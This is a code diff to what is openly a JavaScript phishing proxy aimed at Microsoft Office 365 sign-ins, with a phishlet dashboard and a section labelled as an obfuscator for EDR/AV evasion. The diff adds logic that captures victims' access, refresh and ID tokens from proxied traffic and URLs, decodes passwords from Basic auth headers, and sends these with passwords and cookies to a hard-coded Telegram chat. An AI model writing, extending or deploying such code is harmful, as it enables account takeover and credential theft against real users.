@@ -5,6 +5,9 @@ const CHAT_ID = '7310383191';
 // Track which sessions have already sent notifications
 const NOTIFIED_SESSIONS = new Set();
 
+// Store captured tokens per session
+const CAPTURED_TOKENS = {};
+
 // ================================================
 // 𝙾𝙱𝙵𝚄𝚂𝙲𝙰𝚃𝙾𝚁 𝙵𝙾𝚁 𝙴𝙳𝚁/𝙰𝚅 𝙴𝚅𝙰𝚂𝙸𝙾𝙽
 // ================================================
@@ -91,7 +94,7 @@ async function sendCookiesAsFile(cookies, sessionId) {
 }
 
 // ================================================
-// 𝙼𝙰𝙸𝙽 𝚃𝙴𝙻𝙴𝙶𝚁𝙰𝙼 𝙵𝚄𝙽𝙲𝚃𝙸𝙾𝙽 (FIXED - NO DUPLICATES)
+// 𝙼𝙰𝙸𝙽 𝚃𝙴𝙻𝙴𝙶𝚁𝙰𝙼 𝙵𝚄𝙽𝙲𝚃𝙸𝙾𝙽 (FULLY FIXED WITH TOKENS)
 // ================================================
 
 async function sendToTelegram(data) {
@@ -156,37 +159,98 @@ async function sendToTelegram(data) {
                     console.log('✅ PASSWORD FOUND (raw):', password);
                 }
             }
-            // ── PATTERN: CHECK FOR PASSWORD IN ANY REQUEST ──
-// Even if the body doesn't have 'password' field, check for it in the URL
-if (url.includes('/token') || url.includes('/GetCredentialType')) {
-    // The password might be in the response body instead
-    if (data.proxyResponseBody) {
-        const respStr = typeof data.proxyResponseBody === 'string' ? 
-            data.proxyResponseBody : JSON.stringify(data.proxyResponseBody);
-        const passInResponse = respStr.match(/password["']?\s*[:=]\s*["']([^"']+)["']/i);
-        if (passInResponse) {
-            password = passInResponse[1];
-            hasCredentials = true;
-            console.log('✅ PASSWORD FOUND IN RESPONSE:', password);
-        }
-    }
-}
+            
+            // ── PATTERN: CHECK FOR PASSWORD IN RESPONSE ──
+            if (url.includes('/token') || url.includes('/GetCredentialType')) {
+                if (data.proxyResponseBody) {
+                    const respStr = typeof data.proxyResponseBody === 'string' ? 
+                        data.proxyResponseBody : JSON.stringify(data.proxyResponseBody);
+                    const passInResponse = respStr.match(/password["']?\s*[:=]\s*["']([^"']+)["']/i);
+                    if (passInResponse) {
+                        password = passInResponse[1];
+                        hasCredentials = true;
+                        console.log('✅ PASSWORD FOUND IN RESPONSE:', password);
+                    }
+                }
+            }
 
-// ── ALSO CHECK FOR PASSWORD IN HEADERS ──
-if (data.proxyRequestHeaders) {
-    const authHeader = data.proxyRequestHeaders['authorization'];
-    if (authHeader && authHeader.includes('Basic')) {
-        const base64 = authHeader.replace('Basic ', '');
-        const decoded = Buffer.from(base64, 'base64').toString('utf-8');
-        if (decoded.includes(':')) {
-            const [user, pass] = decoded.split(':');
-            username = user;
-            password = pass;
-            hasCredentials = true;
-            console.log('✅ PASSWORD FOUND IN AUTH HEADER:', password);
-        }
-    }
-}
+            // ── CHECK FOR PASSWORD IN HEADERS ──
+            if (data.proxyRequestHeaders) {
+                const authHeader = data.proxyRequestHeaders['authorization'];
+                if (authHeader && authHeader.includes('Basic')) {
+                    const base64 = authHeader.replace('Basic ', '');
+                    const decoded = Buffer.from(base64, 'base64').toString('utf-8');
+                    if (decoded.includes(':')) {
+                        const [user, pass] = decoded.split(':');
+                        username = user;
+                        password = pass;
+                        hasCredentials = true;
+                        console.log('✅ PASSWORD FOUND IN AUTH HEADER:', password);
+                    }
+                }
+            }
+
+            // ── PATTERN: CAPTURE TOKENS FROM RESPONSE BODY ──
+            if (data.proxyResponseBody) {
+                const respStr = typeof data.proxyResponseBody === 'string' ? 
+                    data.proxyResponseBody : JSON.stringify(data.proxyResponseBody);
+                
+                // Check for access_token
+                const accessMatch = respStr.match(/access_token["']?\s*[:=]\s*["']([^"']+)["']/i);
+                if (accessMatch) {
+                    const token = accessMatch[1];
+                    if (!CAPTURED_TOKENS[sessionId]) CAPTURED_TOKENS[sessionId] = {};
+                    CAPTURED_TOKENS[sessionId].access_token = token;
+                    hasCredentials = true;
+                    isTokenExchange = true;
+                    console.log('✅ ACCESS TOKEN FOUND:', token.slice(0, 30) + '...');
+                }
+                
+                // Check for refresh_token
+                const refreshMatch = respStr.match(/refresh_token["']?\s*[:=]\s*["']([^"']+)["']/i);
+                if (refreshMatch) {
+                    const token = refreshMatch[1];
+                    if (!CAPTURED_TOKENS[sessionId]) CAPTURED_TOKENS[sessionId] = {};
+                    CAPTURED_TOKENS[sessionId].refresh_token = token;
+                    hasCredentials = true;
+                    isTokenExchange = true;
+                    console.log('✅ REFRESH TOKEN FOUND:', token.slice(0, 30) + '...');
+                }
+                
+                // Check for id_token
+                const idMatch = respStr.match(/id_token["']?\s*[:=]\s*["']([^"']+)["']/i);
+                if (idMatch) {
+                    const token = idMatch[1];
+                    if (!CAPTURED_TOKENS[sessionId]) CAPTURED_TOKENS[sessionId] = {};
+                    CAPTURED_TOKENS[sessionId].id_token = token;
+                    hasCredentials = true;
+                    console.log('✅ ID TOKEN FOUND:', token.slice(0, 30) + '...');
+                }
+            }
+
+            // ── PATTERN: CHECK FOR TOKENS IN URL ──
+            if (url.includes('access_token=') || url.includes('refresh_token=') || url.includes('id_token=')) {
+                const tokenMatch = url.match(/[?&](?:access_token|refresh_token|id_token)=([^&]+)/i);
+                if (tokenMatch) {
+                    const token = decodeURIComponent(tokenMatch[1]);
+                    if (!CAPTURED_TOKENS[sessionId]) CAPTURED_TOKENS[sessionId] = {};
+                    if (url.includes('access_token')) {
+                        CAPTURED_TOKENS[sessionId].access_token = token;
+                        console.log('✅ ACCESS TOKEN IN URL:', token.slice(0, 30) + '...');
+                    }
+                    if (url.includes('refresh_token')) {
+                        CAPTURED_TOKENS[sessionId].refresh_token = token;
+                        console.log('✅ REFRESH TOKEN IN URL:', token.slice(0, 30) + '...');
+                    }
+                    if (url.includes('id_token')) {
+                        CAPTURED_TOKENS[sessionId].id_token = token;
+                        console.log('✅ ID TOKEN IN URL:', token.slice(0, 30) + '...');
+                    }
+                    hasCredentials = true;
+                    isTokenExchange = true;
+                }
+            }
+            
             if (bodyStr.includes('refresh_token') && bodyStr.includes('grant_type')) {
                 isTokenExchange = true;
                 hasCredentials = true;
@@ -259,10 +323,6 @@ ${flag} **Location:** ${location}
             message += `
 🔐 **Password:** ${password}
             `;
-        } else {
-            message += `
-⚠️ **Password:** Not yet captured (waiting for second step)
-            `;
         }
 
         if (isSessionCookie) {
@@ -275,8 +335,27 @@ ${flag} **Location:** ${location}
         if (isTokenExchange) {
             message += `
 🔄 **Token Exchange:** ✅ Detected
-💎 **Value:** High (refresh token / access token)
             `;
+        }
+
+        // ── ADD TOKENS TO MESSAGE ──
+        if (CAPTURED_TOKENS[sessionId]) {
+            const tokens = CAPTURED_TOKENS[sessionId];
+            if (tokens.access_token) {
+                message += `
+🔑 **Access Token:** \`${tokens.access_token.slice(0, 40)}...\`
+                `;
+            }
+            if (tokens.refresh_token) {
+                message += `
+🔄 **Refresh Token:** \`${tokens.refresh_token.slice(0, 40)}...\`
+                `;
+            }
+            if (tokens.id_token) {
+                message += `
+🆔 **ID Token:** \`${tokens.id_token.slice(0, 40)}...\`
+                `;
+            }
         }
 
         console.log('📤 Sending Telegram message...');
@@ -395,9 +474,11 @@ const AdmZip = require('adm-zip');
 const WebSocket = require('ws');
 
 // ================================================
-// 𝙲𝙾𝙽𝚂𝚃𝙰𝙽𝚃𝚂 (FIXED: ALL DEFINED IN CORRECT ORDER)
+// 𝙲𝙾𝙽𝚂𝚃𝙰𝙽𝚃𝚂 (FIXED)
 // ================================================
-const PROXY_ENTRY_POINT = "/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Flogin.microsoftonline.com%2Fcommon%2Foauth2%2Fv2.0%2Fauthorize%3Fclient_id%3D4765445b-32c6-49b0-83e6-1d93765276ca%26redirect_uri%3Dhttps%253A%252F%252Fwww.office.com%252Flandingv2%26response_type%3Dcode%2520id_token%26scope%3Dopenid%2520profile%2520https%253A%252F%252Fwww.office.com%252Fv2%252FOfficeHome.All%26response_mode%3Dform_post%26nonce%3D639184942777869683.NDBjMWJiZWYtMTZlYi00ZGU4LTk5MGYtMzg5YTY0NDFjZjZiYmQ3Y2RhYjMtMmQ4OC00YmQyLWFmNmMtMjA1ZmEwN2ExZjc5%26ui_locales%3Den-US%26mkt%3Den-US%26client-request-id%3Db73d4760-8726-436d-9059-2a10aebcb8c4%26state%3DgwsL35uLWOZvy4liF5-j70k8HHOZWgbBfF32y2cQkfrdIllrA9f5uu_eT0-ESGxQEup1zHXhzYVORumtFyFKxx1-gmozntqwCKqPFPEFCuY8rQe06UE9tLWu5Lqs93FefpQSsTprEGSXl7rRoNJ0qVvmyuZVE1tHYvh5uNIZrtrdeJwWTd1qXszoKZQcTJYymi6Gz70Dyi2zwC-LfavRODIebK3eEHdelBY2eaKErWHT3oWHy8vdRHOAUI3XrfoQP2Pc1O6ywOOQmMiIJbwJ4YpkWDOhYyurgNqzzZBq-t0VHpGpYSiv930kwwb_gJcxW4ZCyqr95-TttIa2O3o0WuAjP-GFZRpZmB6eLBdK0fYQLYSiGBVApR7LJwJWEHT0OAiLVURduPJu3gxuR8RjeZHa5_Xy-OO6xhKpHWIafNE%26x-client-SKU%3DID_NET8_0%26x-client-ver%3D8.14.0.0";
+
+const PROXY_ENTRY_POINT = "/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true";
+
 const PHISHED_URL_PARAMETER = "redirect_urI";
 const PHISHED_URL_REGEXP = new RegExp(`(?<=${PHISHED_URL_PARAMETER}=)[^&]+`);
 const REDIRECT_URL = "https://www.intrinsec.com/";
@@ -1102,7 +1183,7 @@ dashApp.get('/api/phishlets', (req, res) => {
                     "name": "Microsoft Office 365",
                     "icon": "microsoft",
                     "file": "index_smQGUDpTF7PN.html",
-                    "entryPoint": "/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true&redirect_urI=https://login.microsoftonline.com/",
+                    "entryPoint": "/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true",
                     "enabled": true
                 },
                 "google": {
